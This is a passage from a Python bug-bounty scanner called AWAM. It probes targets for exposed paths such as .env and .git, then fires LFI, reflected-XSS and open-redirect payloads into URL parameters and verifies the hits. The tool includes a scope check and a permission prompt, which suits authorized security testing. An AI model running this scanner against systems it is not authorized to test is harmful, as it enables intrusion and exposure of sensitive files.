    def validate_targets(self, urls: List[str]) -> List[ScanTarget]:
        """Validasi massal dengan thread pool"""
        logger.log(f"Validating {len(urls)} potential targets...", "INFO")
        
        valid_targets = []
        url_queue = list(set(urls))[:30]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {
                executor.submit(self.validator.validate, url): url 
                for url in url_queue
            }
            
            for future in concurrent.futures.as_completed(future_to_url):
                try:
                    target = future.result(timeout=15)
                    if target:
                        valid_targets.append(target)
                        logger.add_target(target)
                        
                        if target.waf:
                            logger.log(f"WAF detected on {target.domain}: {target.waf['name']}", "WAF")
                        
                        logger.log(f"Active: {target.url} [{target.status_code}]", "SUCCESS")
                except Exception as e:
                    pass
        
        return valid_targets
    
    def discover_endpoints(self, target: ScanTarget) -> Set[str]:
        """Discover endpoints on target"""
        endpoints = set()
        base_url = target.url.rstrip('/')
        
        common_paths = [
            'api', 'v1', 'test', 'admin', 'login', 'user',
            'robots.txt', 'sitemap.xml', '.git', '.env',
            'css', 'js', 'images', 'assets'
        ]
        
        for path in common_paths:
            test_url = f"{base_url}/{path}"
            response = self.make_request(test_url)
            if response and response.status_code < 400:
                endpoints.add(test_url)
                logger.log(f"Found endpoint: {test_url} [{response.status_code}]", "SUCCESS")
        
        return endpoints
    
    def establish_baseline_enhanced(self, url: str) -> Optional[BaselineResponse]:
        """Establish enhanced baseline with multiple samples"""
        if url in logger.baselines:
            return logger.baselines[url]
        
        responses = []
        for i in range(BASELINE_SAMPLES):
            response = self.make_request(url)
            if response:
                responses.append(response)
            time.sleep(0.5)
        
        if len(responses) >= 3:
            baseline = self.baseline_engine.establish_baseline(url, responses)
            if baseline:
                logger.add_baseline(url, baseline)
                return baseline
        
        return None
    
    def test_lfi_enhanced(self, url: str, param: str, baseline: BaselineResponse) -> Optional[Vulnerability]:
        """Enhanced LFI test with PoE verification"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param, [''])[0]
        
        for payload, os_type, technique in PayloadManager.LFI_PAYLOADS[:5]:
            test_url = url.replace(f"{param}={original_value}", f"{param}={urllib.parse.quote(payload)}")
            response = self.make_request(test_url)
            
            if not response:
                continue
            
            # Compare with baseline
            diff = self.baseline_engine.compare_response(url, response, payload)
            
            # PoE verification
            poe_result = self.poe_verifier.verify_lfi(response.text)
            
            if poe_result['verified']:
                # Calculate confidence score
                indicators = [f['type'] for f in poe_result['findings']]
                confidence = self.confidence_scorer.calculate_score(
                    VulnType.LFI, diff, poe_result, indicators
                )
                
                vuln = Vulnerability(
                    vuln_type=VulnType.LFI,
                    target=test_url,
                    severity=Severity.HIGH,
                    confidence=confidence['level'],
                    confidence_score=confidence['score'],
                    confidence_factors=confidence['factors'],
                    payload=payload,
                    parameter=param,
                    evidence=f"Found file content indicators: {', '.join(indicators)}",
                    description="Local File Inclusion vulnerability detected.",
                    remediation="Implement proper path validation.",
                    poe_verified=True,
                    poe_details=poe_result,
                    baseline_diff=diff
                )
                
                if logger.add_vulnerability(vuln):
                    return vuln
        
        return None
    
    def test_xss_enhanced(self, url: str, param: str, baseline: BaselineResponse) -> Optional[Vulnerability]:
        """Enhanced XSS test with context analysis"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param, [''])[0]
        
        # Generate unique marker
        import random
        marker = f"xss_{random.randint(10000, 99999)}"
        
        has_waf = any(t.waf for t in self.targets_to_scan if t.url == url)
        payloads = self.payloads.get_xss_payloads(with_bypass=has_waf, limit=8)
        
        for payload, ptype, technique in payloads:
            # Replace alert(1) with marker
            if 'alert(1)' in payload:
                verify_payload = payload.replace('alert(1)', f"alert('{marker}')")
            else:
                verify_payload = f"<div id='{marker}'>{marker}</div>"
            
            test_url = url.replace(f"{param}={original_value}", f"{param}={urllib.parse.quote(verify_payload)}")
            response = self.make_request(test_url)
            
            if not response:
                continue
            
            # PoE verification
            poe_result = self.poe_verifier.verify_xss(response.text, verify_payload, marker)
            
            if poe_result['verified']:
                diff = self.baseline_engine.compare_response(url, response, verify_payload)
                
                indicators = [k for k, v in poe_result.get('context', {}).items() if v]
                confidence = self.confidence_scorer.calculate_score(
                    VulnType.XSS_REFLECTED, diff, poe_result, indicators
                )
                
                severity_map = {
                    'CRITICAL': Severity.CRITICAL,
                    'HIGH': Severity.HIGH,
                    'MEDIUM': Severity.MEDIUM
                }
                severity = severity_map.get(poe_result.get('severity', 'MEDIUM'), Severity.MEDIUM)
                
                vuln = Vulnerability(
                    vuln_type=VulnType.XSS_REFLECTED,
                    target=test_url,
                    severity=severity,
                    confidence=confidence['level'],
                    confidence_score=confidence['score'],
                    confidence_factors=confidence['factors'],
                    payload=payload,
                    parameter=param,
                    evidence=f"XSS marker '{marker}' reflected",
                    description="Reflected Cross-Site Scripting vulnerability.",
                    remediation="Implement proper output encoding.",
                    poe_verified=True,
                    poe_details=poe_result,
                    baseline_diff=diff
                )
                
                if logger.add_vulnerability(vuln):
                    return vuln
        
        return None
    
    def test_open_redirect_enhanced(self, url: str, param: str) -> Optional[Vulnerability]:
        """Enhanced open redirect test with verification"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        original_value = params.get(param, [''])[0]
        
        for payload, technique in PayloadManager.OPEN_REDIRECT[:5]:
            test_url = url.replace(f"{param}={original_value}", f"{param}={urllib.parse.quote(payload)}")
            
            response = self.make_request(test_url, allow_redirects=False)
            
            if not response:
                continue
            
            location = response.headers.get('Location', '')
            
            poe_result = self.poe_verifier.verify_redirect(location, test_url)
            
            if poe_result['verified']:
                confidence = Confidence.HIGH if poe_result['techniques'] else Confidence.MEDIUM
                confidence_score = 85.0 if poe_result['techniques'] else 65.0
                
                vuln = Vulnerability(
                    vuln_type=VulnType.OPEN_REDIRECT,
                    target=test_url,
                    severity=Severity.MEDIUM,
                    confidence=confidence,
                    confidence_score=confidence_score,
                    confidence_factors=poe_result['techniques'],
                    payload=payload,
                    parameter=param,
                    evidence=f"Redirect to: {location}",
                    description="Open Redirect vulnerability detected.",
                    remediation="Validate redirect URLs.",
                    poe_verified=True,
                    poe_details=poe_result
                )
                
                if logger.add_vulnerability(vuln):
                    return vuln
        
        return None
    
    def scan_url_enhanced(self, url: str):
        """Enhanced URL scanning with baseline comparison"""
        if '?' not in url:
            return
        
        if not self.is_in_scope(url):
            logger.log(f"URL out of scope: {url}", "DEBUG")
            return
        
        logger.log(f"Testing: {url}", "VULN")
        
        # Establish enhanced baseline
        baseline = self.establish_baseline_enhanced(url)
        if not baseline:
            logger.log(f"Cannot establish baseline for {url}, skipping", "DEBUG")
            return
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params.keys():
            if len(param) > 30:
                continue
            
            if self.test_lfi_enhanced(url, param, baseline):
                continue
            if self.test_xss_enhanced(url, param, baseline):
                continue
            if self.test_open_redirect_enhanced(url, param):
                continue
    
    def run_enhanced(self):
        """Main scan orchestration with enhanced features"""
        # Scope reminder
        logger.log(f"Target in scope: {self.base_domain}", "INFO")
        logger.log(f"Scope includes: {', '.join(self.scope_domains)}", "INFO")
        
        # Phase 1: Subdomain Discovery
        logger.log("\n[Phase 1] Subdomain Discovery", "INFO")
        subdomains = self.discover_subdomains()
        urls_to_test = [self.target]
        for s in subdomains[:20]:
            if self.is_in_scope(f"https://{s}"):
                urls_to_test.append(f"https://{s}")
        
        # Phase 2: Target Validation
        logger.log("\n[Phase 2] Target Validation", "INFO")
        self.targets_to_scan = self.validate_targets(urls_to_test)
        
        if not self.targets_to_scan:
            logger.log("No active targets found!", "ERROR")
            return
        
        # Phase 3: Endpoint Discovery
        logger.log("\n[Phase 3] Endpoint Discovery", "INFO")
        for target in self.targets_to_scan[:3]:
            endpoints = self.discover_endpoints(target)
            target.endpoints = endpoints
            self.discovered_urls.update(endpoints)
        
        # Phase 4: Build URL list
        urls_to_scan = []
        common_params = ['id', 'page', 'p', 'q', 'search']
        
        for target in self.targets_to_scan[:2]:
            for param in common_params[:3]:
                urls_to_scan.append(f"{target.url}?{param}=1")
        
        for url in list(self.discovered_urls)[:10]:
            for param in common_params[:2]:
                urls_to_scan.append(f"{url}?{param}=1")
        
        urls_to_scan = list(set(urls_to_scan))[:25]
        
        # Phase 5: Enhanced Vulnerability Scanning
        logger.log("\n[Phase 4] Vulnerability Scanning (Enhanced)", "INFO")
        logger.log(f"Testing {len(urls_to_scan)} URLs...", "PROGRESS")
        
        for i, url in enumerate(urls_to_scan, 1):
            if not self.is_in_scope(url):
                continue
            logger.log(f"Progress: {i}/{len(urls_to_scan)}", "PROGRESS")
            self.scan_url_enhanced(url)
        
        # Final report
        self._print_final_report()
    
    def _print_final_report(self):
        """Print final scan report"""
        logger.log("\n" + "="*60, "SUCCESS")
        logger.log("SCAN COMPLETED".center(60), "SUCCESS")
        logger.log("="*60, "SUCCESS")
        
        duration = datetime.now() - logger.start_time
        logger.log(f"Duration: {str(duration).split('.')[0]}", "INFO")
        logger.log(f"Requests Made: {logger.stats['requests']:,}", "INFO")
        logger.log(f"Targets Tested: {logger.stats['targets_discovered']}", "INFO")
        logger.log(f"Active Targets: {logger.stats['targets_active']}", "INFO")
        logger.log(f"WAF Detected: {logger.stats['waf_detected']}", "WAF")
        logger.log(f"Vulnerabilities Found: {logger.stats['vulnerabilities_found']}", 
                  "VULN" if logger.stats['vulnerabilities_found'] > 0 else "INFO")
        logger.log(f"PoE Verified: {logger.stats['poe_verified']}", "POE")
        logger.log(f"False Positives Caught: {logger.stats['false_positives_caught']}", "WARNING")
        
        if logger.stats['vulnerabilities_found'] > 0:
            accuracy = (logger.stats['vulnerabilities_found'] / 
                       (logger.stats['vulnerabilities_found'] + logger.stats['false_positives_caught'])) * 100
            logger.log(f"Detection Accuracy: {accuracy:.1f}%", "SUCCESS" if accuracy > 80 else "WARNING")
            
            poe_rate = (logger.stats['poe_verified'] / logger.stats['vulnerabilities_found']) * 100
            logger.log(f"PoE Rate: {poe_rate:.1f}%", "POE")
        
        logger.log(f"\nResults saved to:", "INFO")
        logger.log(f"  - {OUTPUT_TXT}", "INFO")
        logger.log(f"  - {OUTPUT_JSON}", "INFO")
        logger.save_results()

def show_help_enhanced():
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║                    AWAM v2.0.0 (Enhanced)                    ║
║            Bug Bounty Automation Framework                    ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}USAGE:{Style.RESET_ALL}
    python3 awam.py -t <target> [options]

{Fore.GREEN}REQUIRED:{Style.RESET_ALL}
    -t, --target TARGET    Target domain (e.g., example.com)

{Fore.GREEN}OPTIONS:{Style.RESET_ALL}
    -r, --rate RATE        Max requests per second (default: 3)
    -T, --threads THREADS  Number of threads (default: 10, max: 20)
    -u, --user-agent UA    Custom User-Agent string
    -v, --verbose          Enable verbose output
    --scope DOMAINS        Additional domains in scope (comma-separated)
    -h, --help             Show this help message

{Fore.GREEN}ENHANCED FEATURES:{Style.RESET_ALL}
    • Baseline Response Engine - Compare normal vs payload responses
    • Proof-of-Exploit Verification - Verify LFI, XSS with actual content
    • Confidence Scoring System - Calculate confidence based on factors
    • False Positive Filtering - Contextual validation
    • Scope Limiter - Restrict scanning to authorized domains

{Fore.YELLOW}LEGAL: Always verify scope and obtain proper authorization!{Style.RESET_ALL}
""")

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-t', '--target', help='Target domain')
    parser.add_argument('-r', '--rate', type=int, default=3, help='Max requests per second')
    parser.add_argument('-T', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-u', '--user-agent', help='Custom User-Agent string')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--scope', help='Additional domains in scope (comma-separated)')
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    
    args = parser.parse_args()
    
    if args.help or not args.target:
        show_help_enhanced()
        sys.exit(0)
    
    # Legal warning
    print(LEGAL_WARNING)
    response = input(f"{Fore.YELLOW}Do you have explicit permission to test this target? (yes/no): {Style.RESET_ALL}")
    if response.lower() not in ['yes', 'y']:
        print(f"{Fore.RED}Exiting. You must have permission to test.{Style.RESET_ALL}")
        sys.exit(0)
    
    # Parse scope
    scope_domains = [args.target]
    if args.scope:
        scope_domains.extend([d.strip() for d in args.scope.split(',')])
    
    # Bersihkan file log lama
    for f in [LOG_FILE, OUTPUT_TXT, OUTPUT_JSON]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass
    
    scanner = AwamScanner(
        target=args.target,
        threads=args.threads,
        rate_limit=args.rate,
        user_agent=args.user_agent,
        verbose=args.verbose,
        scope_domains=scope_domains
    )
    
    def signal_handler(sig, frame):
        logger.log("\nScan interrupted by user", "WARNING")
        logger.save_results()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        scanner.run_enhanced()
    except KeyboardInterrupt:
        logger.log("\nScan interrupted by user", "WARNING")
        logger.save_results()
    except Exception as e:
        logger.log(f"Fatal error: {e}", "ERROR")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
